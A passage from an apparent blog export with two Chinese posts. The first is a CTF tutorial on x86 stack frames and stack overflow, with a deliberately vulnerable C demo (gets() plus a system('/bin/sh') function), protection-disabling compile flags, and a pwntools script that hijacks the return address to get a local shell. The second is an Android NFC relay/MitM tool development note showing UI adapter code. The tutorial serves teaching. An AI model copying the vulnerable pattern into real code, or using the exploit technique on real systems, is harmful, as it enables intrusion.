ebp被更新为被调用函数(callee)的基地址. 例如下面调用calc函数时, 有`mov rbp, rsp`:\n\n   ```assembly\n        0x4006b1 <main+61>        dec    DWORD PTR [rbx+0x458bec55]\n        0x4006b7 <main+67>        lock   mov esi, edx\n        0x4006ba <main+70>        mov    edi, eax\n    →   0x4006bc <main+72>        call   0x400646 <calc>\n      ↳    0x400646 <calc+0>         push   rbp\n           0x400647 <calc+1>         mov    rbp, rsp\n           0x40064a <calc+4>         mov    DWORD PTR [rbp-0x14], edi\n           0x40064d <calc+7>         mov    DWORD PTR [rbp-0x18], esi\n           0x400650 <calc+10>        mov    DWORD PTR [rbp-0x8], 0x0\n           0x400657 <calc+17>        mov    DWORD PTR [rbp-0x4], 0x2\n   ```\n\n   ![img](v2-c350a4c5e9f5bbe839606486f3100185_hd.jpg)\n\n   ![1538826215949](1538826215949.png)\n\n4) 再之后将**被调用函数(callee)的局部变量等数据压入栈**内.\n\n   ![img](v2-63f07378642e6f38197ddfb817567f6c_hd.jpg)\n\n   ```assembly\n       0x80484ec <calc+1>         mov    ebp, esp\n       0x80484ee <calc+3>         sub    esp, 0x10\n       0x80484f1 <calc+6>         mov    DWORD PTR [ebp-0x8], 0x2 # 给d赋值: d=2\n    →  0x80484f8 <calc+13>        mov    eax, DWORD PTR [ebp+0x8] # 将参数a=5赋给eax\n       0x80484fb <calc+16>        imul   eax, DWORD PTR [ebp-0x8] # 5*2(有符号乘)\n       0x80484ff <calc+20>        mov    edx, eax\n       0x8048501 <calc+22>        mov    eax, DWORD PTR [ebp+0xc]\n       0x8048504 <calc+25>        add    eax, edx # 10 + 23\n       0x8048506 <calc+27>        mov    DWORD PTR [ebp-0x4], eax # 赋值给变量c\n   ```\n\n\n\n\n#### (2) 函数调用出栈顺序\n\n1) 栈顶(ESP)会重新指向被调用函数(callee)的基地址, 因此, 被调用函数的局部变量会从站内直接弹出. 如下:\n![img](v2-4340d6c750f59519f4f87dffca03a86a_hd.jpg)\n\n   具体汇编代码是:\n\n   ```assembly\n       0x8048505 <calc+26>        ror    BYTE PTR [ecx+0x458bfc45], 1\n       0x804850b <calc+32>        cld    \n       0x804850c <calc+33>        leave  \n    →  0x804850d <calc+34>        ret    \n      ↳   0x8048564 <main+86>        add    esp, 0x10\n          0x8048567 <main+89>        mov    DWORD PTR [ebp-0x10], eax\n          0x804856a <main+92>        sub    esp, 0x8\n          0x804856d <main+95>        push   DWORD PTR [ebp-0x10]\n          0x8048570 <main+98>        push   0x804863a\n          0x8048575 <main+103>       call   0x8048390 <printf@plt>\n   ```\n\n   如上图, 当执行到`calc`函数的`ret`返回语句时, 会有下面一系列的语句, 其中第一条`add`语句就是让`esp`重新指向`calc`的基址(ebp)的关键语句, 此时位于低地址的局部变量将丢弃.\n\n2) 随后将基地址内存储的调用函数(caller)的ebp的值重新pop到当前的ebp中, 至此, 调用函数(caller)的基地址得以恢复. 值得注意的是, 这一操作是隐式的(与函数调用压栈的第2步作对比). 如下图:\n   - 执行`leave`前:\n     ![1538829057155](1538829057155.png)\n\n   - 执行`leave`后:\n     ![1538829148474](1538829148474.png)\n\n   - `esp`存储的地址会指向返回地址(`0x08048564`):\n     ``` assembly\n     ─────────────────────────────────────────────────────────[ registers ]────\n     $eax   : 0x21      \n     $ebx   : 0x0       \n     $ecx   : 0x1       \n     $edx   : 0xa       \n     $esp   : 0xffffcf5c  →  0x08048564  →  <main+86> add esp, 0x10 # 指向ret地址\n     $ebp   : 0xffffcf88  →  0x00000000\n     $esi   : 0xf7faf000  →  0x001b1db0\n     $edi   : 0xf7faf000  →  0x001b1db0\n     $eip   : 0x804850d   →  <calc+34> ret \n     $eflags: [carry PARITY ADJUST zero sign trap INTERRUPT direction overflow resume virtualx86 identification]\n     $gs: 0x0063  $fs: 0x0000  $ds: 0x002b  $cs: 0x0023  $es: 0x002b  $ss: 0x002b \n     ```\n\n3) 然后将返回地址从栈内pop出来, 并存到`eip`内. 从而调用函数(caller)的`eip`信息得以恢复, 指向下一条指令.\n![1538830059726](1538830059726.png)\n\n> 总结一下上面的调用压栈和出栈: \n>\n> (1)压栈时, 先压参数, 后压返回地址, 然后再将caller的`ebp`压入, 最后将局部变量压入.\n>\n> (2)出栈时, 先弹局部变量, 后弹ebp, 然后通过返回地址恢复`eip`.\n>\n> 通过上述描述, 可知函数调用压栈和出栈是一个互逆过程, 这也间接验证了堆栈平衡的机理.\n\n\n\n------------------\n\n### 0x14 寄存器分布\n\n![img](register.png)\n\n> 32位和64位程序的部分区别:\n>\n> - x86\n>   - **函数参数**在**函数返回地址**的上方\n> - x64\n>   - System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)中前六个整型或指针参数依次保存在**RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上。\n>   - 内存地址不能大于 0x00007FFFFFFFFFFF，**6 个字节长度**，否则会抛出异常。\n\n\n\n--------------------\n\n## 0x20 栈溢出原理\n\n栈溢出的原理其实很简单: **在程序没有判断输入长度的情况下, 当程序向申请的变量写入的字节长度超过了该变量向内存申请的字节长度, 因而导致该变量相邻的栈的内存的值被覆盖.** 简而言之, 还是开篇提及的两个栈溢出条件. 由于操作系统或者程序增加了对栈溢出的保护, 而使得溢出的难度增大, 但其核心思想是不变的. 我们先用根据下图来看看溢出的效果:\n\n1) 在执行漏洞函数之前, 我们能看到`ebp` `esp`的地址很正常, ebp的下一个地址也指向了`return address`.\n\n   ![1538897713778](1538897713778.png)\n\n2) 接着当我们执行到漏洞函数之时, 输入以下字符串:\n\n   ```bash\n   aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808\n   ```\n\n3) 我们再看看此时的堆栈:\n\n   ```bash\n   ──────────────────────────────────────────────────────────────[ registers ]────\n   $eax   : 0x25      \n   $ebx   : 0x0       \n   $ecx   : 0xffffffff\n   $edx   : 0xf7fae870  →  0x00000000\n   $esp   : 0xffffcf30  →  0xf7fad300  →  0xf7f56447  →  \"ISO-10646/UCS2/\"\n   $ebp   : 0x33333333 (\"3333\"?)\n   $esi   : 0xf7fad000  →  0x001b1db0\n   $edi   : 0xf7fad000  →  0x001b1db0\n   $eip   : 0x38303830 (\"0808\"?)\n   $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]\n   $gs: 0x0063  $ds: 0x002b  $cs: 0x0023  $es: 0x002b  $fs: 0x0000  $ss: 0x002b  \n   ```\n\n   不难看出, 此时的`ebp`被覆盖为`0x33333333` ,`eip`被覆盖为`0x38303830`. 至此, 栈溢出完美实现!\n\n\n\n------------\n\n## 0x30 栈溢出实战-小试牛刀\n\n首先, 先写一个有漏洞的脚本程序:\n\n```c\n/*************************************************************************\n\t> File Name: stack-overflow-demo.c\n\t> Author: killshadow\n\t> Mail: chaceli@foxmail.com\n\t> Created Time: 2018年10月07日 星期日 13时02分34秒\n ************************************************************************/\n\n#include<stdio.h>\n#include<string.h>\n\nvoid exec(){\n    printf(\"Congratulations! You have already get shell!\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid vulnerablefunc(){\n    char s[20];\n    gets(s);\n    puts(s);\n}\n\nint main(int argc, char **argv){\n    vulnerablefunc();\n    return 0;\n}\n```\n\n上面的程序中, `exec()`可以执行shell命令, 但是没有在主函数执行; `vulnerablefunc()`执行了一个没有判断输入字符串长度的`gets`函数, 该函数是一个危险函数(不判断输入字符串的长度), 编译时也能看得出来:\n\n```bash\n➜  demo gcc -m32 -fno-stack-protector stack-overflow-demo.c -o stack-overflow-demo\nstack-overflow-demo.c: In function ‘exec’:\nstack-overflow-demo.c:13:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]\n     system(\"/bin/sh\");\n     ^\nstack-overflow-demo.c: In function ‘vulnerablefunc’:\nstack-overflow-demo.c:18:5: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]\n     gets(s);\n     ^\n/tmp/ccA0jCUY.o: In function `vulnerablefunc':\nstack-overflow-demo.c:(.text+0x37): warning: the `gets' function is dangerous and should not be used.\n```\n\n上面编译有两个warning: 1)第一个warning提示危险的`system`函数(系统调用); 2)第二个warning就是`gets`函数了. 该命令中, `-fno-stack-protectotor`表示不开启堆栈溢出保护(不生成canary). 同时, 还可以关闭地址随机化PIE(Position Independent Executable), 如果`gcc -v`后能看到`--enable-default-pie`即为开启了PIE. 我们在编译时, 添加`-no-pie`参数即可关闭PIE.\n\n此时我们在shell下反汇编`objdump -d stack-overflow-demo`:(截取部分汇编)\n\n```assembly\n0804846b <exec>:\n 804846b:\t55                   \tpush   %ebp\n 804846c:\t89 e5                \tmov    %esp,%ebp\n 804846e:\t83 ec 08             \tsub    $0x8,%esp\n 8048471:\t83 ec 0c             \tsub    $0xc,%esp\n 8048474:\t68 60 85 04 08       \tpush   $0x8048560\n 8048479:\te8 b2 fe ff ff       \tcall   8048330 <puts@plt>\n 804847e:\t83 c4 10             \tadd    $0x10,%esp\n 8048481:\t83 ec 0c             \tsub    $0xc,%esp\n 8048484:\t68 8d 85 04 08       \tpush   $0x804858d\n 8048489:\te8 b2 fe ff ff       \tcall   8048340 <system@plt>\n 804848e:\t83 c4 10             \tadd    $0x10,%esp\n 8048491:\t90                   \tnop\n 8048492:\tc9                   \tleave  \n 8048493:\tc3                   \tret    \n\n08048494 <vulnerablefunc>:\n 8048494:\t55                   \tpush   %ebp\n 8048495:\t89 e5                \tmov    %esp,%ebp\n 8048497:\t83 ec 28             \tsub    $0x28,%esp\n 804849a:\t83 ec 0c             \tsub    $0xc,%esp\n 804849d:\t8d 45 e4             \tlea    -0x1c(%ebp),%eax # ebp-0x1c即为s的地址\n 80484a0:\t50                   \tpush   %eax\n 80484a1:\te8 7a fe ff ff       \tcall   8048320 <gets@plt> # 这里调用gets函数\n 80484a6:\t83 c4 10             \tadd    $0x10,%esp\n 80484a9:\t83 ec 0c             \tsub    $0xc,%esp\n 80484ac:\t8d 45 e4             \tlea    -0x1c(%ebp),%eax\n 80484af:\t50                   \tpush   %eax\n 80484b0:\te8 7b fe ff ff       \tcall   8048330 <puts@plt>\n 80484b5:\t83 c4 10             \tadd    $0x10,%esp\n 80484b8:\t90                   \tnop\n 80484b9:\tc9                   \tleave  \n 80484ba:\tc3                   \tret    \n\n080484bb <main>:\n 80484bb:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx\n 80484bf:\t83 e4 f0             \tand    $0xfffffff0,%esp\n 80484c2:\tff 71 fc             \tpushl  -0x4(%ecx)\n 80484c5:\t55                   \tpush   %ebp\n 80484c6:\t89 e5                \tmov    %esp,%ebp\n 80484c8:\t51                   \tpush   %ecx\n 80484c9:\t83 ec 04             \tsub    $0x4,%esp\n 80484cc:\te8 c3 ff ff ff       \tcall   8048494 <vulnerablefunc>\n 80484d1:\tb8 00 00 00 00       \tmov    $0x0,%eax\n 80484d6:\t83 c4 04             \tadd    $0x4,%esp\n 80484d9:\t59                   \tpop    %ecx\n 80484da:\t5d                   \tpop    %ebp\n 80484db:\t8d 61 fc             \tlea    -0x4(%ecx),%esp\n 80484de:\tc3                   \tret    \n 80484df:\t90                   \tnop\n```\n\n执行`gets`函数之前, `vulnerablefunc`的栈帧为:\n\n```assembly\n                            High\n                    +---------------------+\n                    |                     |\n                    |    Return Address   |\n                    |                     |\n                    +---------------------+\n                    |                     |\n                    |    Caller's ebp     |\n                    |                     |\n                    +---------------------+ <------+ ebp\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    +---------------------+\n                    |   Local Variables   |\n                    |    (char s[20])     |\n                    +---------------------+ <------+ s, [ebp-0x1c]\n                              Low\n```\n\n`gets`函数执行后, `vulnerablefunc`的栈帧为:(输入: `aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808`)\n\n```assembly\n                         High\n                 +---------------------+\n                 |                     |\n                 |    Return Address   |\n                 |    (0x38303830)     |\n                 +---------------------+\n                 |                     |\n                 |    Caller's ebp     |\n                 |    (0x33333333)     |\n                 +---------------------+ <------+ ebp\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 +---------------------+\n                 |   Local Variables   |\n                 |      (aaaa...)      |\n                 +---------------------+ <-------+ s, [ebp-0x1c]\n                         Low\n```\n\n这里的`0x1c`是`char`型变量`s`与`ebp`的相对地址, 所以要覆盖`ebp`, 就需要构造`0x1c`个字节的payload, 后面四个字节是`ebp`的地址, 紧接着`ebp`的后面四个字节的地址便是返回地址. 因此, 如果要覆盖返回地址, 让函数弹出栈帧时弹到自己想要返回到的函数地址, 就需要先找到**需要利用的函数的地址**, 然后将这个地址加进payload里, 如下所示代码:\n\n```python\n#!/usr/bin/python\n# coding=utf-8\nfrom pwn import *\n\n# open this elf executable file\nsh = process('./stack-overflow-demo')\n# objdump -d stack-overflow-demo, you can find \"exec\" function's address\nexec_addr = 0x0804846B\n\n# 0x1c is offset address from ebp, [ebp - 0x1c] is \"s\" address\n# \"aaaa\" can cover ebp value\n# return address had changed exec_addr\npayload = \"a\" * 0x1c + \"aaaa\" + p32(exec_addr)\n# print small end address\nprint p32(exec_addr)\n\n# send payload into process\nsh.sendline(payload)\n# get interactive shell\nsh.interactive()\n```\n\n执行该脚本之后, 可以获得shell:\n\n```bash\n➜  demo python stack-overflow-demo-attack.py\n[+] Starting local process './stack-overflow-demo': pid 20109\nk\\x84\\x0\n[*] Switching to interactive mode\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak\\x84\\x0\nCongratulations! You have already get shell!\n$ uname -a\nLinux ks 4.15.0-36-generic #39~16.04.1-Ubuntu SMP Tue Sep 25 08:59:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n\n\n至此, 你的第一个栈溢出攻击的过程就完美实现啦! Keep Moving!!!\n\n\n\n--------------------\n\n\n## 0x40 参考链接\n\n> 部分内容引自如下blog, 如有侵权立即更改本文.\n\n[100个gdb小技巧](https://wizardforcel.gitbooks.io/100-gdb-tips/content/)\n\n[手把手教你栈溢出从入门到放弃（上）](https://zhuanlan.zhihu.com/p/25816426)\n\n[C语言函数调用栈(一)](http://www.cnblogs.com/clover-toeic/p/3755401.html)\n\n[C语言函数调用栈(二)](http://www.cnblogs.com/clover-toeic/p/3756668.html)\n\n[栈介绍-CTF-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack_intro/)","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"PWN","slug":"PWN","permalink":"http://www.killshadow.xyz/tags/PWN/"}]},{"title":"NFC开发笔记","date":"2018-09-08T16:00:00.000Z","path":"2018/09/09/NFC开发笔记/","raw":"---\ntitle: NFC开发笔记\ndate: 2018-09-09\ncategories:\ntoc: ture\ntags:\n\t- Android Developer\ncomments: true\n---\n\n## 0x00 概述\n\n> 在正式开始介绍项目前，我想先介绍一下背景及一些废话，方便大家能够更好理解这个项目。这个项目起初是为了能够更好地抓取手机与IC卡之间的交互数据，以及对抓取的数据进行分析。<!-- more -->后来在抓取数据过程当中，希望能够实现某些数据的替换（中间人）、重放、中继，以此展开了一系列的功能扩展。此外，对于数据提取这一块，也做了一些专门的优化，如：在Log中发送数据到HCE模块或者到MitM模块。文章的最后还会对希望扩展的功能进一步分析。我暂且把这个项目的整体设计模式称为：VNNC模式（View Network NFC Control，可以简单理解为MVC模式），对应的包如下图。为了加速apdu数据流的数据传输，我们还增加了多线程功能，这个方式将数据的SQLite存储与apdu数据流分离在不同线程，以保证高效、有序地对数据操作。这个设计模式是鄙人自命名的，如有纰漏，请指正。以下会对整个项目进行解释，以方便接管项目者快速理解整个项目，少走一些弯路。\n\n```haxe\n.\n└── tud\n    └── seemuh\n        └── nfcgate\n            ├── gui\n            │   ├── AboutActivity.java\n            │   ├── AboutWorkaroundActivity.java\n            │   ├── adapter\n            │   │   ├── ListViewAdapter.java\n            │   │   ├── MitmItemAdapter.java\n            │   │   └── MulAdapter.java\n            │   ├── EditActivity.java\n            │   ├── fragments\n            │   │   ├── CloneFragment.java\n            │   │   ├── EnablenfcDialog.java\n            │   │   ├── HceFragment.java\n            │   │   ├── LoggingDetailFragment.java\n            │   │   ├── LoggingFragment.java\n            │   │   ├── MitmFragment.java\n            │   │   ├── RelayFragment.java\n            │   │   ├── SettingsFragment.java\n            │   │   ├── TokenDialog.java\n            │   │   └── WorkaroundDialog.java\n            │   ├── LogActivity.java\n            │   ├── LoggingDetailActivity.java\n            │   ├── MainActivity.java\n            │   ├── MitmActivity.java\n            │   ├── RuleActivity.java\n            │   ├── SettingsActivity.java\n            │   ├── Splash.java\n            │   ├── tabLayout\n            │   │   ├── SlidingTabLayout.java\n            │   │   └── SlidingTabStrip.java\n            │   └── tabLogic\n            │       └── PagerAdapter.java\n            ├── network\n            │   ├── c2c\n            │   │   └── C2C.java\n            │   ├── c2s\n            │   │   └── C2S.java\n            │   ├── Callback.java\n            │   ├── HighLevelNetworkHandler.java\n            │   ├── HighLevelProtobufHandler.java\n            │   ├── LowLevelNetworkHandler.java\n            │   ├── LowLevelTCPHandler.java\n            │   ├── meta\n            │   │   └── MetaMessage.java\n            │   └── ProtobufCallback.java\n            ├── nfc\n            │   ├── config\n            │   │   ├── ConfigBuilder.java\n            │   │   ├── ConfigOption.java\n            │   │   ├── OptionType.java\n            │   │   └── Technologies.java\n            │   ├── hce\n            │   │   ├── ApduService.java\n            │   │   ├── DaemonConfiguration.java\n            │   │   └── PaymentServiceHost.java\n            │   ├── NfcManager.java\n            │   └── reader\n            │       ├── DesfireWorkaround.java\n            │       ├── IsoDepReader.java\n            │       ├── NfcAReader.java\n            │       ├── NfcBReader.java\n            │       ├── NfcFReader.java\n            │       ├── NFCTagEmulator.java\n            │       ├── NFCTagReader.java\n            │       └── NfcVReader.java\n            └── util\n                ├── CustomTextWatcher.java\n                ├── db\n                │   ├── CloneListItem.java\n                │   ├── CloneListStorage.java\n                │   ├── DbInitTask.java\n                │   ├── RuleListItem.java\n                │   ├── RuleListStorage.java\n                │   ├── SessionLoggingContract.java\n                │   └── SessionLoggingDbHelper.java\n                ├── filter\n                │   ├── action\n                │   │   ├── Action.java\n                │   │   ├── ActionSequence.java\n                │   │   ├── Append.java\n                │   │   ├── InsertBytes.java\n                │   │   ├── ReplaceBytes.java\n                │   │   ├── ReplaceContent.java\n                │   │   └── Truncate.java\n                │   ├── conditional\n                │   │   ├── All.java\n                │   │   ├── And.java\n                │   │   ├── Conditional.java\n                │   │   ├── EndsWith.java\n                │   │   ├── Equals.java\n                │   │   ├── Length.java\n                │   │   ├── Not.java\n                │   │   ├── Or.java\n                │   │   ├── StartsWith.java\n                │   │   └── Xor.java\n                │   ├── FilterInitException.java\n                │   ├── Filter.java\n                │   └── FilterManager.java\n                ├── ItemBean.java\n                ├── MitmComm.java\n                ├── NfcComm.java\n                ├── NfcSession.java\n                ├── preference\n                │   └── IntEditTextPreference.java\n                ├── ReadLoadedSo.java\n                ├── RootManager.java\n                ├── RuleMatching.java\n                ├── sink\n                │   ├── FileSink.java\n                │   ├── SessionLoggingSink.java\n                │   ├── SinkInitException.java\n                │   ├── Sink.java\n                │   ├── SinkManager.java\n                │   └── TextViewSink.java\n                ├── UpdateUI.java\n                └── Utils.java\n```\n\n## 0x01 视图模块之Fragment/Activity\n\n### Ⅰ. adapter\n\nadapter包里又有三个细分的adapter，分别是：`ListViewAdapter`、`MitmItemAdapter`、`MulAdapter`。\n\n#### 1. ListViewAdapter\n\n这个Adapter主要是用在`HCE`模块中的列表的Item，每个Item包含两个`EditText`和一个`Button`, 为了能够更好管理`EditText`和一个`Button`的相关性, 而增加了这个adapter(适配器). 主要代码如下:\n\n```java\n    @Override\n    public View getView(final int position, View convertView, ViewGroup parent) {\n        ViewHolder holder = null;\n        if (convertView == null) {\n            convertView = LayoutInflater.from(mContext).inflate(R.layout.item_hce_edittext, null);\n            holder = new ViewHolder(convertView);\n            convertView.setTag(holder);\n        } else {\n            holder = (ViewHolder) convertView.getTag();\n        }\n\n        final ItemBean itemObj = mData.get(position);\n\n        //This is important. Remove TextWatcher first.\n        if (holder.editText1.getTag() instanceof TextWatcher) {\n            holder.editText1.removeTextChangedListener((TextWatcher) holder.editText1.getTag());\n        }\n\t\t// 设置读卡器的命令\n        holder.editText1.setText(itemObj.getReader());\n        holder.bt.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                mData.remove(position);\n                if(Utils.RuleOrTable){\n                    Utils.currentRule.remove(itemObj.getReader());\n                    Utils.ruleAdapter.notifyDataSetChanged();\n                }else {\n\n                    Utils.currentMap.remove(itemObj.getReader());\n                    Utils.tableAdapter.notifyDataSetChanged();\n                }\n            }\n        });\n\n        TextWatcher watcher = new TextWatcher() {\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n                oldString=s.toString();\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                if (TextUtils.isEmpty(s)) {\n                    itemObj.setReader(\"\");\n                } else {\n                    itemObj.setReader(s.toString());\n                    if(Utils.RuleOrTable){\n                        Utils.currentRule=Utils.ChangeReader(Utils.currentRule,oldString,s.toString());\n                    }else {\n                        Utils.currentMap=Utils.ChangeReader(Utils.currentMap,oldString,s.toString());\n                    }\n                }\n            }\n        };\n\n        holder.editText1.addTextChangedListener(watcher);\n        holder.editText1.setTag(watcher);\n\n\n\n        //This is important. Remove TextWatcher first.\n        if (holder.editText2.getTag() instanceof TextWatcher) {\n            holder.editText2.removeTextChangedListener((TextWatcher) holder.editText2.getTag());\n        }\n\n        holder.editText2.setText(itemObj.getCard());\n\n        TextWatcher watcher2 = new TextWatcher() {\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                if (TextUtils.isEmpty(s)) {\n                    itemObj.setCard(\"\");\n                } else {\n                    itemObj.setCard(s.toString());\n\n                    if(Utils.RuleOrTable){\n                        Utils.currentRule=Utils.ChangeCard(Utils.currentRule,itemObj.getReader(),s.toString());\n                    }else {\n                        Utils.currentMap=Utils.ChangeCard(Utils.currentMap,itemObj.getReader(),s.toString());\n                    }\n                }\n            }\n        };\n\n        holder.editText2.addTextChangedListener(watcher2);\n        holder.editText2.setTag(watcher2);\n        return convertView;\n    }\n```\n\n重写`getView`方法可以从视图中获取当前的ListItem, 并对ListItem进行约束. 上面代码段可看到有个一`TextWatcher`方法, 这个方法将在`CustomTextWatcher.java`详细解释.\n\n#### 2. MitmItemAdapter\n\n这应该是该项目中最复杂的`Adapter`了, 其中每个Item包含四个`Button`, 三个`TextView`, 对应每个`Button`都有对应的`OnclickListener` , 根据选中的`Button`的`id`来`switch`, 对应代码如下:\n\n```java\nView.OnClickListener mOnClickListener = new View.OnClickListener() {\n    @Override\n    public void onClick(View v) {\n        synchronized (itemDisable) {\n            synchronized (itemButtons) {\n                RuleListStorage db = new RuleListStorage(mContext);\n                List<RuleListItem> items = db.getAll();\n                switch (v.getId()) {\n                    case R.id.mitm_list_btn_exec_card:\n                        ...\n                    case R.id.mitm_list_btn_exec_reader:\n                        ...\n                    case R.id.mitm_list_btn_edit:\n                        ...\n                    case R.id.mitm_list_btn_delete:\n                        ...\n                }\n            }\n        }\n    }\n};\n```\n\n如上示代码, `v.getId`方法对应每个`Button`的id, 而四个`Button`都有对`RuleListStorage`操作, 具体SQLite的介绍在后面会详细解释. 值得注意的是, 上示代码段中引用了两个`sychronized`, 是为了各个Item在滑动过程中, 保持状态`button.setEnable(boolean)`. item的状态之所以会发生改变, 是因为adapter的缓存和预浏览机制. 具体原因请google: ArrayAdapter 滑动item状态发生改变. \n\n这里想要细讲的是关于`AlertDialog`的使用, 这里都是围绕着`etBuilder`来建立的. `AlertDialog`的作用是设置一个弹框, 然后把xml对应的组件设置进去. 如下:\n\n```java\nAlertDialog.Builder etBuilder = new AlertDialog.Builder(mContext);\nfinal View view = LayoutInflater.from(mContext).inflate(R.layout.dialog_mitm_comm_setting, null);\nfinal EditText etName = view.findViewById(R.id.mitm_setting_comm_name);\nfinal EditText etReader = view.findViewById(R.id.mitm_setting_reader_comm);\nfinal EditText etCard = view.findViewById(R.id.mitm_setting_card_comm);\netReader.addTextChangedListener(new CustomTextWatcher(etReader));\netCard.addTextChangedListener(new CustomTextWatcher(etCard));\netName.setText(mList.get(position).getName());\netReader.setText(Utils.bytesToHex(mList.get(position).getReaderComm().getData()));\netCard.setText(Utils.bytesToHex(mList.get(position).getCardComm().getData()));\netBuilder.setTitle(\"Edit Rule\")\n    .setView(view)\n    .setCancelable(true)\n    .setPositiveButton(\"Save\", new DialogInterface.OnClickListener() {\n        @Override\n        public void onClick(DialogInterface dialog, int which) {\n            // get data from user, then storage in database\n            String name = etName.getText().toString();\n            String reader = etReader.getText().toString().replace(\" \", \"\");\n            String card = etCard.getText().toString().replace(\" \", \"\");\n\n            if (name.length() == 0) {\n                Toast.makeText(mContext, \"Please input command Function!\", Toast.LENGTH_SHORT).show();\n                return;\n            } else if (!Utils.isHex(mContext, reader) && Utils.isHex(mContext, card)) {\n                return;\n            }\n\n            // save in database\n            RuleListItem ruleListItem = new RuleListItem(\n                mList.get(position).getId(),\n                name,\n                new NfcComm(NfcComm.Source.HCE, Utils.toBytes(reader)),\n                new NfcComm(NfcComm.Source.CARD, Utils.toBytes(card))\n            );\n            RuleListStorage mRuleDb = new RuleListStorage(mContext);\n            mRuleDb.update(ruleListItem);\n\n            // refreshList for list item view\n            MitmFragment.getInstance().refreshList();\n\n            notifyDataSetChanged();\n\n            // show toast\n            Toast.makeText(mContext, \"Save Successfully!\", Toast.LENGTH_SHORT).show();\n            dialog.dismiss();\n        }\n    });\netBuilder.setNegativeButton(\"Cancel\", new DialogInterface.OnClickListener() {\n    @Override\n    public void onClick(DialogInterface dialog, int which) {\n        dialog.dismiss();\n    }\n});\netBuilder.create();\netBuilder.show();\nbreak;\n```\n\n#### 3. MulAdapter\n\n这个`Adapter`比较简单, 只有`CheckBox`和`TextView`, 要注意的是, `CheckBox`在`ListView`中滑动时, 被勾选的状态也会发生改变(选中之后, 下滑返回选中状态就消失, 原因是`public View getView(int position, View convertView, ViewGroup parent)`传进来的`convertView`被多次重用), 这就需要用额外的方法保持被勾选的状态. 解决办法是用`HashMap`来保存`CheckBox`的状态值:\n\n```java\nprivate static HashMap<Integer,Boolean> isSelected = new HashMap<Integer, Boolean>();\n```\n\n如下方法是从`Fragment`中传入list之后, 根据list的状态设置`CheckBox`选中状态.可以视为初始化`CheckBox`.\n\n```java\n// MulAdapter中设置此方法.\npublic void initCheck(List<NfcComm> mlist) {\n    for (int i = 0; i < mlist.size(); i++) {\n        isSelected.put(i,mlist.get(i).isCheck());\n    }\n}\n\n// NFCComm中设置此方法.\n// checkbox getter and setter\npublic boolean isCheck() {\n    return mCheck;\n}\npublic void setCheck(boolean mCheck) {\n        this.mCheck = mCheck;\n}\n\n// LoggingFragment中 ListItem 点击事件的响应, 设置CheckBox的状态\nprotected void onListItemClick(View v, int pos, long id) {\n    // get ViewHolder Object\n    ViewHolder holder = (ViewHolder)v.getTag();\n    // change checbox status\n    holder.cb.toggle();\n    // save select state in mEvenList\n    mEventList.get(pos).setCheck(true);\n    // save checkbox selected status\n  MulAdapter.getIsSelected().put(pos,holder.cb.isChecked());\n    // adjust selected item\n    if (holder.cb.isChecked() == true) {\n        mCheckNum++;\n    } else {\n        mCheckNum--;\n    }\n    Toast.makeText(v.getContext(),\"Already selected \" + mCheckNum\n                   + \" item.\",Toast.LENGTH_SHORT).show();\n}\n```\n\n### Ⅱ. Fragment\n\n#### 1. CloneFragment\n\n这里的一些监听事件就不细讲, 挑一些重要的讲一下. \n\n`Fragment`与`Activity`是相辅相成的, 一个`Activity`可以有多个`Fragment`, 例如, 该项目中的`MainActivity`中调用了多个`Fragment`(具体调用及原理参阅<安卓编程权威指南>第10章), 而`Fragment`被调用的方式如下: \n\n```java\n// CloneFragment的一个方法, 这个方法被其他class调用, 从而调用该Fragment\npublic static CloneFragment getInstance() {\n    if(mFragment == null) {\n        mFragment = new CloneFragment();\n    }\n    return mFragment;\n}\nRelayFragment.getInstance();RelayFragment.getInstance();\n```\n\n其中, 发现标签后, 会做如下写数据库操作:\n\n```java\nCloneListStorage storage = new CloneListStorage(mContext);\n                            storage.add(new CloneListItem(RelayFragment.getInstance().mNfcManager.getAnticolData(), value.toString()));\n```\n\n这里从`RelayFragment`中获取实例后, 再调用该实例里的`mNfcManager`实例的方法获得卡的UID. 随机UID的方法在接下来数据库操作那里解释.\n\n#### 2. EnablenfcDialog\n\n这个`Dialog`在NFC没开启的情况下, 会跳出该`Dialog`, 提示去系统设置里打开NFC.\n\n```java\n// 在MainActivity中, 继承了EnableNFCDialog, 因此重载了该方法, 并调用了Settings\n@Override\n    public void onNFCDialogPositiveClick() {\n        // User touched the dialog's goto settings button\n        Intent intent = new Intent(Settings.ACTION_NFC_SETTINGS);\n        startActivity(intent);\n    }\n```\n\n#### 4. HceFragment\n\n这个`Fragment`是第四个Tab, 也就是`Hce`下的视图界面代码, 值得关注的几点有:\n\n- 动态申请存储权限\n\n  ```java\n  // ActivityCompat.requestPermissions的方法能够调用申请的dialog\n  if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {\n      if (ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != 